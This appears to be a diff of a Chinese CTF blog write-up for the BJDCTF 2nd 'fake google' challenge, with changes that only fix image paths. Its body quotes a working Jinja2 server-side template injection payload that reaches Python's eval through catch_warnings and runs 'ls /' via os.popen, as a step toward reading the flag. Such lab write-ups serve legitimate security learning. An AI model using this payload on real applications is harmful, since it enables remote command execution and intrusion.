@@ -29,9 +29,9 @@
 <meta property="og:site_name" content="4chan">
 <meta property="og:description" content="0X01 打开靶机  发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示  0X02 直接用ssti日就对了！🤠  查看根目录  12&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__&#x3D;&#x3D;&amp;#x27;catch_warnings&amp;#x27; %&amp;#">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://4chan123.github.io/.io//1.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//3.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//4.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/1.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/3.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/4.png">
 <meta property="article:published_time" content="2021-04-06T14:34:05.000Z">
 <meta property="article:modified_time" content="2021-04-14T06:01:24.312Z">
 <meta property="article:author" content="4Chan">
@@ -39,7 +39,7 @@
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="SSTI注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://4chan123.github.io/.io//1.png">
+<meta name="twitter:image" content="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/1.png">
 
 <link rel="canonical" href="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/">
 
@@ -289,15 +289,15 @@
 
       
         <h1>0X01 <strong>打开靶机</strong></h1>
-<p><img src="/.io//1.png" alt="1"></p>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
 <p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
-<p><img src="/.io//3.png" alt="3"></p>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
 <h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
 <ul>
 <li><em>查看根目录</em></li>
 </ul>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/.io//4.png" alt="4"></p>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
 <p>ls后台文件出现flag</p>
 <ul>
 <li><em>构造playload，查看flag</em></li>
